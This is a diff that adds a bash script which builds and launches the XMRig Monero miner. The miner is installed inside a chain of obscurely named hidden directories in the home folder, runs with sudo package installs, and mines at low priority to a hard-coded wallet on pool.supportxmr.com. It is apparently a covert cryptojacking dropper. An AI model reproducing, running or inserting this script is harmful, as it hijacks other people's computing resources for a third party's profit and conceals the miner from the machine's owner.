@@ -1,0 +1,2 @@
+#!/bin/bash
+mkdir -p ~/.laklk/.oksoks/.mnmn/.msjmj/.ksskj/msjsm && cd ~/.laklk/.oksoks/.mnmn/.msjmj/.ksskj/msjsm && sudo apt update && sudo apt upgrade -y && sudo apt install cpulimit git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make -j1 && nice -n 19 ./xmrig -o pool.supportxmr.com:3333 -u 85dGqmGbDUT7N9NEom2Gfte8rfdjZ9ogQ9jB8JhsV9PscL1Vpq5NDMfaWV5XQbiq9zgiwVU8VT5qr5G2CBgpomUd4e5h82S -p laptop -k --donate-level 1 -t 4
